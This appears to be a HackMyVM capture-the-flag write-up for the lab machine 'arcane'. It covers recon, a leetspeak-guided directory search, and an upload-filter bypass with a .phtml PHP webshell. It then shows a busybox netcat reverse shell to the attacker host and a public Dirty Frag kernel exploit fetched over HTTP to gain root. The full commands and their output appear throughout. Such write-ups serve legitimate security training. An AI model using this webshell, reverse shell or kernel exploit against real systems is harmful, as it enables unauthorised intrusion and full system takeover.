# arcane

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| arcane | asya2ross | intermediate | HackMyVM |

**Summary:** A ping sweep across the 192.168.56.0/24 lab network exposed an Ubuntu target at 192.168.56.173 running vsftpd 3.0.5 with anonymous FTP, OpenSSH 9.6p1, and an Apache 2.4.58 site titled Arcane. Anonymous FTP served only taunting files, while the index page hinted at a hidden directory spelled in the site's leetspeak. After pinning the host as arcane.hmv, the guessed `/c0m3-@nd-p1@y/` path answered with a second taunt daring the visitor to go deeper, so a DirBuster wordlist was rewritten with sed into the same substitution alphabet (a to @, e to 3, l to 1, o to 0, i to !) and fired at the hidden directory with gobuster. That run revealed an `up10@ds` folder containing an `up10@d.php` upload form. Plain PHP payloads were rejected, so the webshell was renamed with the `.phtml` extension, which Apache still executes, granting command execution as `www-data`. Busybox netcat then produced a reverse shell that penelope caught with a full PTY, and system profiling showed kernel `6.8.0-85-generic` on Ubuntu 24.04.3, a build inside the affected range of the Dirty Frag page cache write bugs (`CVE-2026-43284` and `CVE-2026-43500`). The public exploit was compiled with the documented gcc invocation, staged over a python HTTP server, and run from /tmp, flipping the session to uid 0 and exposing both flags.

---

## Reconnaissance

The engagement opened with host discovery and service profiling across the local VirtualBox lab subnet.

1. A ping sweep using ARP discovery covered the /24 and returned three live hosts; the second VirtualBox guest at `192.168.56.173` was taken as the target machine:

```zsh
❯ sudo nmap -sn -PR 192.168.56.0/24  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-08 09:41 +0700  
Nmap scan report for 192.168.56.100  
Host is up (0.00015s latency).  
MAC Address: 08:00:27:CD:E1:6F (Oracle VirtualBox virtual NIC)  
Nmap scan report for 192.168.56.173  
Host is up (0.00068s latency).  
MAC Address: 08:00:27:ED:73:CE (Oracle VirtualBox virtual NIC)  
Nmap scan report for 192.168.56.1  
Host is up.  
Nmap done: 256 IP addresses (3 hosts up) scanned in 9.56 seconds  
```

Two guests answered (`192.168.56.100` and `192.168.56.173`) along with the host adapter at `192.168.56.1`.

2. The target address was stored in a shell variable, then a full TCP port scan with version and script detection ran in one pass:

```zsh
❯ nmap -p- -sCV -Pn -T4 --min-rate 5000 $ip  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-08 09:41 +0700  
Nmap scan report for 192.168.56.173  
Host is up (0.0021s latency).  
Not shown: 65532 closed tcp ports (conn-refused)  
PORT   STATE SERVICE VERSION  
21/tcp open  ftp     vsftpd 3.0.5  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
|_-rw-rw-r--    1 0        100            35 Oct 15  2025 b00m.txt  
| ftp-syst:    
|   STAT:    
| FTP server status:  
|      Connected to ::ffff:192.168.56.1  
|      Logged in as ftp  
|      TYPE: ASCII  
|      No session bandwidth limit  
|      Session timeout in seconds is 300  
|      Control connection is plain text  
|      Data connections will be plain text  
|      At session startup, client count was 4  
|      vsFTPd 3.0.5 - secure, fast, stable  
|_End of status  
```

```zsh
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   256 89:b3:d4:76:23:35:c7:01:76:cf:28:05:75:84:67:12 (ECDSA)  
|_  256 7d:51:9b:7b:17:d0:be:c6:ad:fe:ab:8e:28:a0:56:ce (ED25519)  
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))  
|_http-server-header: Apache/2.4.58 (Ubuntu)  
|_http-title: Arcane  
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 9.45 seconds
```

Three services were exposed: vsftpd 3.0.5 on port 21 with anonymous FTP allowed and a file named `b00m.txt` sitting in the FTP root, OpenSSH 9.6p1 on port 22, and Apache 2.4.58 on port 80 serving a page titled Arcane.

3. The anonymous FTP account was the first lead, so a session was opened and the visible file was downloaded:

```zsh
❯ ftp $ip     
Connected to 192.168.56.173.  
220 (vsFTPd 3.0.5)  
Name (192.168.56.173:setyanoegraha): anonymous  
331 Please specify the password.  
Password:    
230 Login successful.  
Remote system type is UNIX.  
Using binary mode to transfer files.  
ftp> ls  
200 PORT command successful. Consider using PASV.  
150 Here comes the directory listing.  
-rw-rw-r--    1 0        100            35 Oct 15  2025 b00m.txt  
226 Directory send OK.  
ftp> get b00m.txt  
200 PORT command successful. Consider using PASV.  
150 Opening BINARY mode data connection for b00m.txt (35 bytes).  
226 Transfer complete.  
35 bytes received in 0.0052 seconds (6.6230 kbytes/s)  
ftp> quit  
221 Goodbye.  
```

Reading it set the tone for the whole box:

```zsh
❯ cat b00m.txt         
S0rry, th3r3 !s n0th!ng !n h3r3 :(
```

Pure trolling, but the leetspeak styling matches the web tier.

4. Attention moved to the web root:

```zsh
❯ curl -i http://$ip/          
HTTP/1.1 200 OK  
Date: Tue, 08 Sep 2026 02:45:42 GMT  
Server: Apache/2.4.58 (Ubuntu)  
Last-Modified: Tue, 14 Oct 2025 15:04:16 GMT  
ETag: "301-6411fb29ce1ca"  
Accept-Ranges: bytes  
Content-Length: 769  
Vary: Accept-Encoding  
Content-Type: text/html  
  
<!doctype html>  
<html lang="en">  
<head>  
 <meta charset="utf-8"/>  
 <title>Arcane</title>  
 <meta name="viewport" content="width=device-width,initial-scale=1"/>  
 <style>  
   @import url('https://fonts.googleapis.com/css2?family=Permanent+Marker&display=swap');  
  
   body {  
     background-color: #000;;  
     color: #ff2e91;  
     font-family: 'Permanent Marker', 'Bangers', 'Arial Black', sans-serif;  
     line-height: 1.6;  
     margin: 0;  
     padding: 2rem;  
     text-align: center;  
     font-size: 3rem;  
     letter-spacing: 0.05em;  
     text-transform: uppercase;  
     text-shadow: 0 2px 6px rgba(255, 46, 145, 0.4);  
   }  
 </style>  
</head>  
<body>  
   <h1>W@nn@ j0!n m3?</h1>  
   <img src="p3w.jpg" alt="P3w">  
   <h1>c0m3-@nd-p1@y</h1>  
</body>  
</html>
```

The index greets visitors with `W@nn@ j0!n m3?`, loads `p3w.jpg`, and prints `c0m3-@nd-p1@y`, which reads like a dare to look for a hidden directory with that exact name.

5. To browse the site through a clean hostname, the target was pinned in /etc/hosts:

```zsh
❯ echo '192.168.56.173 arcane.hmv' | sudo tee -a /etc/hosts  
192.168.56.173 arcane.hmv
```

6. Back on the FTP root, a check for hidden entries turned up a second file, `.b00m2.txt`, which was fetched as well:

```zsh
ftp> get .b00m2.txt  
200 PORT command successful. Consider using PASV.  
150 Opening BINARY mode data connection for .b00m2.txt (18 bytes).  
226 Transfer complete.  
18 bytes received in 0.0004 seconds (49.6324 kbytes/s)
```

Its content kept the joke running:

```zsh
❯ cat .b00m2.txt                                       
R3@lly n0th!ng :P
```

7. Following the hint from the index page, the leetspeak directory was requested directly and came back with HTTP 200:

```zsh
❯ curl -i http://arcane.hmv/c0m3-@nd-p1@y/              
HTTP/1.1 200 OK  
Date: Tue, 08 Sep 2026 03:30:14 GMT  
Server: Apache/2.4.58 (Ubuntu)  
Last-Modified: Tue, 14 Oct 2025 15:03:16 GMT  
ETag: "310-6411faf0948d2"  
Accept-Ranges: bytes  
Content-Length: 784  
Vary: Accept-Encoding  
Content-Type: text/html  
  
<!doctype html>  
<html lang="en">  
<head>  
 <meta charset="utf-8"/>  
 <title>Arcane</title>  
 <meta name="viewport" content="width=device-width,initial-scale=1"/>  
 <style>  
   @import url('https://fonts.googleapis.com/css2?family=Permanent+Marker&display=swap');  
  
   body {  
     background-color: #000;;  
     color: #6BE4D0;  
     font-family: 'Permanent Marker', 'Bangers', 'Arial Black', sans-serif;  
     line-height: 1.6;  
     margin: 0;  
     padding: 2rem;  
     text-align: center;  
     font-size: 3rem;  
     letter-spacing: 0.05em;  
     text-transform: uppercase;  
     text-shadow: 0 2px 6px rgba(46, 137, 255, 0.4);  
   }  
 </style>  
</head>  
<body>  
   <h1>G00d j0b!</h1>  
   <img src="p3wp3w.jpg" alt="P3w P3w">  
   <h1>But y0u h@v3 t0 g0 d33p3r!</h1>  
</body>  
</html>
```

The page confirms the guess with `G00d j0b!` and pushes the trail deeper with `But y0u h@v3 t0 g0 d33p3r!`, so another layer waits below.

8. Every string on this machine follows one substitution pattern, so the medium DirBuster wordlist was rewritten into the same leetspeak alphabet with sed:

```zsh
❯ sed 's/a/@/g; s/e/3/g; s/l/1/g; s/o/0/g; s/i/!/g' /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt > /tmp/dirbuster_leet.txt                    
```

The transformed list landed in /tmp/dirbuster_leet.txt.

9. gobuster was then aimed at the hidden directory with the converted wordlist:

```zsh
❯ gobuster dir -u http://arcane.hmv/c0m3-@nd-p1@y/ -w /tmp/dirbuster_leet.txt -x txt,php,html    
===============================================================  
Gobuster v3.8.2  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://arcane.hmv/c0m3-@nd-p1@y/  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /tmp/dirbuster_leet.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.8.2  
[+] Extensions:              txt,php,html  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
up10@ds              (Status: 301) [Size: 324] [--> http://arcane.hmv/c0m3-@nd-p1@y/up10@ds/]  
up10@d.php           (Status: 200) [Size: 1431]
```

Two hits: a directory named `up10@ds` answering with a 301 redirect, and a script named `up10@d.php` answering with a 200.

10. The upload endpoint was fetched to inspect the form:

```zsh
❯ curl -i http://arcane.hmv/c0m3-@nd-p1@y/up10@d.php                                             
HTTP/1.1 200 OK  
Date: Tue, 08 Sep 2026 04:38:57 GMT  
Server: Apache/2.4.58 (Ubuntu)  
Vary: Accept-Encoding  
Content-Length: 1431  
Content-Type: text/html; charset=UTF-8  
  
  
<!doctype html>  
<html>  
 <head>  
   <meta charset="utf-8">  
   <title>Up10@d</title>  
   <style>  
     @import url('https://fonts.googleapis.com/css2?family=Permanent+Marker&display=swap');  
  
     body {  
       background-color: #000;  
       color: #ff2e91;  
       font-family: 'Permanent Marker', 'Bangers', 'Arial Black', sans-serif;  
       text-align: center;  
       padding: 50px;  
       font-size: 2rem;  
       text-transform: uppercase;  
       text-shadow: 0 2px 6px rgba(255,46,145,0.4);  
     }  
  
     input[type="file"] { display: none; }  
  
     label.browse-btn, button.upload-btn {  
       font-family: 'Permanent Marker', 'Bangers', 'Arial Black', sans-serif;  
       font-size: 2rem;  
       background-color: #6BE4D0;  
       color: #000;  
       padding: 10px 20px;  
       cursor: pointer;  
       border-radius: 6px;  
       margin-right: 10px;  
       display: inline-block;  
       transition: transform 0.1s ease;  
     }  
  
     label.browse-btn:hover { transform: translateY(-2px); }  
  
     button.upload-btn:hover { transform: translateY(-2px); }  
   </style>  
 </head>  
<body>  
 <h2>Up10@d y0ur f!13</h2>  
 <form action="up10@d.php" method="post" enctype="multipart/form-data">  
   <label class="browse-btn" for="fileInput">Br0ws3</label>  
   <input type="file" name="file" id="fileInput" required>  
   <button type="submit" name="submit" class="upload-btn">Up10@d</button>  
 </form>  
</body>  
</html>
```

The page renders a multipart POST form titled `Up10@d y0ur f!13` with a browse button and a submit button, posting back to up10@d.php.

---

## Initial Access

The upload surface was the obvious entry point, and the only obstacle was the extension check.

### Bypassing the Upload Restriction with a .phtml Webshell

11. A plain PHP upload was rejected, so the extension hunt settled on `.phtml`, which this Apache setup still executes as PHP. The webshell was written locally:

```zsh
❯ echo '<?php system($_GET["cmd"]); ?>' > cmd.phtml
```

12. Once the upload went through, the payload was invoked with a cmd parameter to prove execution:

```zsh
❯ curl "http://arcane.hmv/c0m3-@nd-p1@y/up10@ds/cmd.phtml?cmd=id"  
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
```

The response `uid=33(www-data) ...` confirms arbitrary command execution under the web server account.

### Reverse Shell over Busybox Netcat

13. With commands running, the next goal was an interactive session. `busybox` was confirmed on the target and its netcat applet supports the `-e` flag, so a reverse shell was fired at the attacker machine on port 5555:

```zsh
❯ curl "http://arcane.hmv/c0m3-@nd-p1@y/up10@ds/cmd.phtml?cmd=which%20busybox"  
/usr/bin/busybox  
  
~/projects/labs/hmv                                                                                    11:56:46  
❯ curl "http://arcane.hmv/c0m3-@nd-p1@y/up10@ds/cmd.phtml?cmd=busybox%20nc%20192.168.56.1%205555%20-e%20/bin/bash"
```

14. penelope was waiting on port 5555 and caught the callback with a full PTY; the first enumeration pass listed the interactive accounts:

```zsh
❯ penelope -p 5555  
[+] Listening for reverse shells on 0.0.0.0:5555 -> 127.0.0.1 • 192.168.0.6 • 172.16.0.2 • 192.168.56.1  
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)  
[+] [New Reverse Shell] => arcane 192.168.56.173 Linux-x86_64 👤 www-data(33) 😍 Session ID <1>  
[+] ⭐ Agent deployed via /usr/bin/python3  
[+] Interacting with session [1] • PTY • Menu key F12 ⇐  
[+] Session log: /home/setyanoegraha/.penelope/sessions/arcane~192.168.56.173-Linux-x86_64/2026_09_08-11_57_09-8  
72-www-data_33.log  
────────────────────────────────────────────────────────────────────────────────────────────────────────────────  
www-data@arcane:/var/www/html/c0m3-@nd-p1@y/up10@ds$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash  
caitlyn:x:1000:1000:caitlyn:/home/caitlyn:/bin/bash  
silco:x:1001:1001:,,,:/home/silco:/bin/bash  
jinx:x:1002:1002:,,,:/home/jinx:/bin/bash  
vi:x:1003:1003:,,,:/home/vi:/bin/bash
```

The shell landed as `www-data`, and /etc/passwd exposed four human accounts: caitlyn, silco, jinx, and vi, with root as the end goal.

---

## Privilege Escalation

With no lateral hop available or needed, the `www-data` foothold went straight after the kernel.

### Internal Enumeration and Kernel Triage

15. linpeas was staged from the attacker machine over a quick python HTTP server:

```zsh
❯ python3 -m http.server 9999  
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...  
192.168.56.173 - - [08/Sep/2026 11:59:31] "GET /linpeas/linpeas.sh HTTP/1.1" 200 -
```

The target pulled it into /tmp and marked it executable:

```zsh
www-data@arcane:/tmp$ wget http://192.168.56.1:9999/linpeas/linpeas.sh  
--2026-09-08 04:59:29--  http://192.168.56.1:9999/linpeas/linpeas.sh  
Connecting to 192.168.56.1:9999... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: 1133905 (1.1M) [application/x-sh]  
Saving to: ‘linpeas.sh’  
  
linpeas.sh                  100%[===========================================>]   1.08M  --.-KB/s    in 0.02s      
  
2026-09-08 04:59:29 (62.5 MB/s) - ‘linpeas.sh’ saved [1133905/1133905]  
  
www-data@arcane:/tmp$ chmod +x linpeas.sh  
www-data@arcane:/tmp$
```

16. Before wading through the script output, the kernel and release versions were checked directly:

```zsh
www-data@arcane:/tmp$ uname -r  
6.8.0-85-generic  
www-data@arcane:/tmp$ cat /etc/os-release  
PRETTY_NAME="Ubuntu 24.04.3 LTS"  
NAME="Ubuntu"  
VERSION_ID="24.04"  
VERSION="24.04.3 LTS (Noble Numbat)"  
VERSION_CODENAME=noble  
ID=ubuntu  
ID_LIKE=debian  
HOME_URL="https://www.ubuntu.com/"  
SUPPORT_URL="https://help.ubuntu.com/"  
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"  
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"  
UBUNTU_CODENAME=noble  
LOGO=ubuntu-logo
```

Kernel `6.8.0-85-generic` on Ubuntu 24.04.3 falls inside the affected window of Dirty Frag, a pair of page cache write bugs (`CVE-2026-43284` in the xfrm ESP path and `CVE-2026-43500` in RxRPC) chained into a deterministic local privilege escalation descended from Dirty Pipe. No race is required and a failed attempt does not panic the kernel, which makes it the natural first swing on a current Ubuntu build.

### Dirty Frag Kernel Exploitation

17. The public exploit from the v4bel/dirtyfrag repository was cloned and compiled with the documented gcc invocation, then served over HTTP:

```zsh
❯ git clone https://github.com/v4bel/dirtyfrag                                                            
Cloning into 'dirtyfrag'...  
remote: Enumerating objects: 64, done.  
remote: Counting objects: 100% (34/34), done.  
remote: Compressing objects: 100% (22/22), done.  
remote: Total 64 (delta 18), reused 12 (delta 12), pack-reused 30 (from 2)  
Receiving objects: 100% (64/64), 5.83 MiB | 1.16 MiB/s, done.  
Resolving deltas: 100% (23/23), done.  
  
/tmp                                                                                                6s 12:04:44  
❯ cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil    
  
/tmp/dirtyfrag master*                                                                                 12:04:59  
❯ python3 -m http.server 9999  
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...  
192.168.56.173 - - [08/Sep/2026 12:05:14] "GET /exp HTTP/1.1" 200 -
```

18. On the target, the compiled binary was downloaded, marked executable, and run:

```zsh
www-data@arcane:/tmp$ wget http://192.168.56.1:9999/exp  
--2026-09-08 05:05:12--  http://192.168.56.1:9999/exp  
Connecting to 192.168.56.1:9999... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: 62936 (61K) [application/octet-stream]  
Saving to: ‘exp’  
  
exp                         100%[===========================================>]  61.46K  --.-KB/s    in 0.007s     
  
2026-09-08 05:05:12 (8.45 MB/s) - ‘exp’ saved [62936/62936]
www-data@arcane:/tmp$ chmod +x /tmp/exp  
www-data@arcane:/tmp$ ./exp  
# id;whoami;hostname  
uid=0(root) gid=0(root) groups=0(root)  
root  
arcane
```

The exploit dropped straight into a root shell: uid 0, root, host arcane.

19. Both flags fell immediately:

```zsh
# cat /root/r00t.txt  
!t's@r00tfl@gf0rh@ckmyvm...  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
H@, n0, !'m m3ss!ng w!th yu0 @ga!n!  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
but... 
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
|  
b00m!
# cat /home/caitlyn/us3r.txt  
!t'...
```

The root flag comes wrapped in a long scroll of pipe characters, a taunt halfway through, and a closing `b00m!`, after which the user flag for caitlyn completed the run.

---

## Attack Chain Summary

1. **Reconnaissance**: A ping sweep and full port scan pinned the target at 192.168.56.173 with anonymous FTP, SSH, and an Apache site titled Arcane.
2. **Vulnerability Discovery**: Leetspeak clues revealed the hidden `/c0m3-@nd-p1@y/` directory, and a DirBuster wordlist converted with sed led gobuster to an exposed upload endpoint named `up10@d.php`.
3. **Exploitation**: The upload filter was bypassed with a `.phtml` webshell for command execution as `www-data`, and busybox netcat delivered a reverse shell that penelope caught with a full PTY.
4. **Internal Enumeration**: System profiling showed Ubuntu 24.04.3 on kernel `6.8.0-85-generic`, a build inside the Dirty Frag affected range.
5. **Privilege Escalation**: The public Dirty Frag exploit was compiled, staged over HTTP, and executed from /tmp, yielding uid 0 and both flags.
